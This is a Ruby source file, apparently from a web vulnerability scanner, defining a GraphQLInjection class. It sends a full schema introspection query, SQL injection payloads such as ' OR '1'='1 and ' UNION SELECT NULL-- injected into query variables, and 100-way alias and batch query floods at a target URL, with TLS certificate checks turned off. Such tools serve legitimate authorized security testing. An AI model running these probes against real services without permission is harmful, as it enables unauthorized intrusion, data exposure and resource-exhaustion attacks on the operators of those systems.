require 'uri'
require 'net/http'
require 'json'
require_relative '../utils/network'
require_relative '../utils/colorize'

class GraphQLInjection
  INTROSPECTION_QUERY = <<~GRAPHQL
    query IntrospectionQuery {
      __schema {
        queryType { name }
        mutationType { name }
        subscriptionType { name }
        types {
          ...FullType
        }
        directives {
          name
          description
          locations
          args {
            ...InputValue
          }
        }
      }
    }
    fragment FullType on __Type {
      kind
      name
      description
      fields(includeDeprecated: true) {
        name
        description
        args {
          ...InputValue
        }
        type {
          ...TypeRef
        }
        isDeprecated
        deprecationReason
      }
      inputFields {
        ...InputValue
      }
      interfaces {
        ...TypeRef
      }
      enumValues(includeDeprecated: true) {
        name
        description
        isDeprecated
        deprecationReason
      }
      possibleTypes {
        ...TypeRef
      }
    }
    fragment InputValue on __InputValue {
      name
      description
      type { ...TypeRef }
      defaultValue
    }
    fragment TypeRef on __Type {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
                ofType {
                  kind
                  name
                  ofType {
                    kind
                    name
                  }
                }
              }
            }
          }
        }
      }
    }
  GRAPHQL

  def self.test_introspection(url)
    begin
      uri = URI(url)
      http = Net::HTTP.new(uri.host, uri.port)
      http.use_ssl = uri.scheme == 'https'
      http.verify_mode = OpenSSL::SSL::VERIFY_NONE if http.use_ssl
      
      req = Net::HTTP::Post.new(uri.path)
      req['Content-Type'] = 'application/json'
      req.body = { query: INTROSPECTION_QUERY }.to_json
      
      res = http.request(req)
      
      if res.code.to_i == 200
        data = JSON.parse(res.body) rescue nil
        if data && data['data'] && data['data']['__schema']
          puts Colorize.red("GraphQL introspection enabled!")
          return data
        end
      end
    rescue => e
    end
    
    nil
  end

  def self.test_sqli(url, query)
    sqli_payloads = [
      "' OR '1'='1",
      "' UNION SELECT NULL--",
      "') OR ('1'='1",
      "' OR 1=1--"
    ]
    
    vulnerable = false
    
    sqli_payloads.each do |payload|
      begin
        modified_query = query.gsub(/\$\w+/, payload)
        
        uri = URI(url)
        http = Net::HTTP.new(uri.host, uri.port)
        http.use_ssl = uri.scheme == 'https'
        http.verify_mode = OpenSSL::SSL::VERIFY_NONE if http.use_ssl
        
        req = Net::HTTP::Post.new(uri.path)
        req['Content-Type'] = 'application/json'
        req.body = { query: modified_query }.to_json
        
        res = http.request(req)
        
        if res.code.to_i == 200
          body = res.body.downcase
          if body.include?('sql') || body.include?('mysql') || body.include?('error') || body.include?('syntax')
            puts Colorize.red("GraphQL SQLi vulnerability!")
            puts Colorize.yellow("Payload: #{payload}")
            vulnerable = true
          end
        end
      rescue => e
      end
    end
    
    vulnerable
  end

  def self.test_field_duplication(url, query)
    begin
      uri = URI(url)
      http = Net::HTTP.new(uri.host, uri.port)
      http.use_ssl = uri.scheme == 'https'
      http.verify_mode = OpenSSL::SSL::VERIFY_NONE if http.use_ssl
      
      duplicated_query = query + query
      
      req = Net::HTTP::Post.new(uri.path)
      req['Content-Type'] = 'application/json'
      req.body = { query: duplicated_query }.to_json
      
      res = http.request(req)
      
      if res.code.to_i == 200
        puts Colorize.yellow("Field duplication test completed")
        return res.body
      end
    rescue => e
    end
    
    nil
  end

  def self.test_aliases(url, query)
    begin
      uri = URI(url)
      http = Net::HTTP.new(uri.host, uri.port)
      http.use_ssl = uri.scheme == 'https'
      http.verify_mode = OpenSSL::SSL::VERIFY_NONE if http.use_ssl
      
      aliased_query = "query { " + (1..100).map { |i| "alias#{i}: #{query}" }.join(" ") + " }"
      
      req = Net::HTTP::Post.new(uri.path)
      req['Content-Type'] = 'application/json'
      req.body = { query: aliased_query }.to_json
      
      res = http.request(req)
      
      if res.code.to_i == 200
        puts Colorize.yellow("Alias test completed")
        return res.body
      end
    rescue => e
    end
    
    nil
  end

  def self.test_batch_queries(url, query)
    begin
      uri = URI(url)
      http = Net::HTTP.new(uri.host, uri.port)
      http.use_ssl = uri.scheme == 'https'
      http.verify_mode = OpenSSL::SSL::VERIFY_NONE if http.use_ssl
      
      batch = (1..100).map { |i| { query: query } }
      
      req = Net::HTTP::Post.new(uri.path)
      req['Content-Type'] = 'application/json'
      req.body = batch.to_json
      
      res = http.request(req)
      
      if res.code.to_i == 200
        puts Colorize.yellow("Batch query test completed")
        return res.body
      end
    rescue => e
    end
    
    nil
  end
end

